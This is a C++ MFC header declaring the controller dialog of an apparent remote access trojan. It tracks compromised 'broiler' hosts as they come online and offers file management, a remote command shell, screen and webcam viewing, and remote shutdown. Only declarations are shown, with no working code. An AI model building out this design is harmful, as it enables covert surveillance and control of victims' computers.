
// ClientDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "MsgNoticeWnd.h"
#include "BroilerData.h"
#include "Config.h"

// CClientDlg 对话框
class CClientDlg : public CDialog
{
// 构造
public:
	CClientDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
	enum { IDD = IDD_DLG_CLIENT };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持

// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	void InitTray();  //初始化托盘
	void ShowTrayTask();  //显示托盘
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CBitmap m_MenuBmp[7];   //菜单项图标
    CImageList m_ImageList;  //图像列表
	CImageList m_ImageHostList;  //摄像头图像列表
	CListCtrl m_listCtrl;
	CToolBar m_toolBarCtrl;    //工具栏
	CStatusBar m_statusBarCtrl;  //状态栏
	CMsgNoticeWnd *m_pMsgWindow;  //窗口提示消息类
	NOTIFYICONDATA m_nid;  //托盘
	bool m_bNotify;  //是否已经显示托盘
private:
	CRect m_rect;
	SOCKET m_ListenSocket;  //监听socket
	bool m_bSound;     //上下线提示
    CConfig m_cfg;     //配置信息
	UINT m_maxConn;   //最大连接数
	UINT m_nPort;     //端口号
public:
	afx_msg LRESULT OnShowTask(WPARAM wParam,LPARAM lParam); //任务托盘
    void UpdateMain(IN const UINT nPort);
	UINT32 InitSocket(OUT bool* pbSuccess);
	static DWORD WINAPI InitSocketProc(LPVOID lpParameter);  //socket初始化线程函数
	void AddHost(SOCKET socket, sockaddr_in addr);          //添加上线主机
	void AddNewItemData(SOCKET socket, sockaddr_in addr);
    void UpdateStatusBarInfo();   //更新状态栏信息
	void OnFileManager();  //文件管理
	void OnCmdShellManager();  //CMDShell管理
	void OnSysManager();  //系统管理
    void OnScreenManager();  //屏幕查看
	void OnVideoManager();  //摄像头

	CBroilerData* GetSelfItemInfo();  //得到选择项的

	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	LRESULT OnAddHost(WPARAM wparam, LPARAM lparam);  //主机上线
	LRESULT OnOffLine(WPARAM wparam, LPARAM lparam);  //主机上线
	void ShowMsgNotice(IN CString strCaption, IN CString strOnlineMsg);  //上线提示消息
	afx_msg void OnClose();
	afx_msg void OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnMenuMsg();
	afx_msg void OnMenuShutdown();
	afx_msg void OnMenuReset();
	afx_msg void OnMenuLogoff();
	afx_msg void OnMenuVoice();
	afx_msg void OnMenuRemoteCmd();
	afx_msg void OnMenuDesktop();
	afx_msg void OnDestroy();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnMenuTrayHide();
	afx_msg void OnMenuTrayShow();
	afx_msg void OnMenuTrayExit();
};

